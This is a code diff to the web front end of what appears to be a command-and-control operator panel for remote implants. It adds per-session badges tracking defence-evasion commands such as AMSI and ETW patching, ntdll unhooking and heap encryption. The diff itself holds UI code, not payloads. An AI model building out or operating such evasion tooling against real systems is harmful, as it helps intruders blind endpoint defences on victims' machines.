@@ -249,8 +249,11 @@ window.UI = {
                     <td class="p-4 host-os-cell"></td>
                     <td class="p-4 font-mono text-xs text-gray-500 truncate max-w-[100px] host-hwid"></td>
                     <td class="p-4 host-modules"></td>
+                    <td class="p-4 host-evasion"></td>
                     <td class="p-4 text-right host-actions"></td>`;
                 tbody.appendChild(row);
+                // Hydrate badge state from command history once per new row.
+                window.EvasionFlags?.initFromHistory(h.id);
             }
 
             const safe = escHtml(h.hostname || '');
@@ -283,6 +286,14 @@ window.UI = {
             }
 
             const actionCell = row.querySelector('.host-actions');
+            const evasionCell = row.querySelector('.host-evasion');
+            if (evasionCell) {
+                const badges = window.EvasionFlags?.renderBadges(h.id) || '';
+                const badgesHtml = badges
+                    ? `<div style="display:flex;gap:3px;flex-wrap:wrap;">${badges}</div>`
+                    : '<span style="font-size:10px;color:var(--text-muted);">—</span>';
+                if (evasionCell.innerHTML !== badgesHtml) evasionCell.innerHTML = badgesHtml;
+            }
             const proxyBtn   = h.has_proxy
                 ? `<button onclick="window.ProxyManager.stop(${h.id})" class="text-red-400 hover:text-white border border-red-500 hover:bg-red-600 px-2 py-1 rounded text-xs transition flex items-center gap-1"><i class="fas fa-stop-circle"></i> Stop</button>`
                 : `<button onclick="window.ProxyManager.start(${h.id})" class="text-blue-500 hover:text-white border border-blue-500 hover:bg-blue-600 px-2 py-1 rounded text-xs transition flex items-center gap-1"><i class="fas fa-network-wired"></i> Proxy</button>`;
@@ -303,7 +314,7 @@ window.UI = {
 
     ensureTableHeader() {
         const theadRow = document.querySelector('#hosts-table')?.parentElement?.querySelector('thead tr');
-        if (theadRow && !theadRow.innerHTML.includes('Scripts')) {
+        if (theadRow && !theadRow.innerHTML.includes('Evasion')) {
             theadRow.innerHTML = `
                 <th class="p-4">ID</th>
                 <th class="p-4">Hostname</th>
@@ -311,7 +322,92 @@ window.UI = {
                 <th class="p-4">OS</th>
                 <th class="p-4">HWID</th>
                 <th class="p-4">Scripts</th>
+                <th class="p-4">Evasion</th>
                 <th class="p-4 text-right">Actions</th>`;
         }
     }
+};
+
+// ── Evasion Status Badges ──────────────────────────────────────────────
+//
+// Tracks which evasion techniques have been applied to each session.
+// State is persisted in localStorage so it survives page refresh.
+// Updated in two ways:
+//   1. setFlag() called by the terminal when an evasion command is sent
+//   2. initFromHistory() called once on page load, scans command history
+
+window.EvasionFlags = {
+
+    // Map of command string fragments → flag name
+    _cmdMap: {
+        'evasion:patch_amsi':    'amsi',
+        'evasion:patch_etw':     'etw',
+        'evasion:unhook_ntdll':  'ntdll',
+        'evasion:patch_all':     ['amsi', 'etw', 'ntdll'],
+        'evasion:encrypt_heap':  'mask',
+    },
+
+    _key(sessionId) { return `rcm_ev_${sessionId}`; },
+
+    get(sessionId) {
+        try { return JSON.parse(localStorage.getItem(this._key(sessionId)) || '{}'); }
+        catch (_) { return {}; }
+    },
+
+    setFlag(sessionId, flag, val = true) {
+        const flags = this.get(sessionId);
+        if (Array.isArray(flag)) flag.forEach(f => { flags[f] = val; });
+        else flags[flag] = val;
+        localStorage.setItem(this._key(sessionId), JSON.stringify(flags));
+    },
+
+    // Call after dispatching any command from the terminal so the badge
+    // updates immediately without waiting for a history refresh.
+    onCommand(sessionId, cmd) {
+        const lower = cmd.toLowerCase().trim();
+        for (const [frag, flag] of Object.entries(this._cmdMap)) {
+            if (lower === frag || lower.startsWith(frag + ' ')) {
+                this.setFlag(sessionId, flag);
+            }
+        }
+    },
+
+    // Initialise from command history on page load (one fetch per session).
+    async initFromHistory(sessionId) {
+        const url = window.Auth?.url?.replace(/\/$/, '');
+        if (!url) return;
+        try {
+            const r = await fetch(`${url}/api/hosts/${sessionId}/history`,
+                { headers: { 'X-API-KEY': window.Auth.key } });
+            if (!r.ok) return;
+            const history = await r.json();
+            (history || []).forEach(entry => {
+                const cmd = (entry.command || '').toLowerCase().trim();
+                for (const [frag, flag] of Object.entries(this._cmdMap)) {
+                    if (cmd === frag || cmd.startsWith(frag + ' ')) {
+                        this.setFlag(sessionId, flag);
+                    }
+                }
+            });
+        } catch (_) {}
+    },
+
+    // Render the badge row HTML for a given session.
+    renderBadges(sessionId) {
+        const flags = this.get(sessionId);
+        const defs = [
+            { key: 'amsi',  label: 'AMSI',  title: 'AMSI scan interface patched' },
+            { key: 'etw',   label: 'ETW',   title: 'ETW event write patched' },
+            { key: 'ntdll', label: 'NTDLL', title: 'Ntdll .text unhooked' },
+            { key: 'mask',  label: 'MASK',  title: 'Heap / sleep encrypted' },
+        ];
+        return defs.map(d => {
+            const on  = !!flags[d.key];
+            const cls = on
+                ? 'bg-green-900/60 text-green-300 border-green-700'
+                : 'bg-gray-800/60 text-gray-600 border-gray-700';
+            return `<span class="text-[10px] px-1.5 py-0.5 rounded border font-mono ${cls}"
+                         title="${d.title}">${d.label}</span>`;
+        }).join('');
+    },
 };
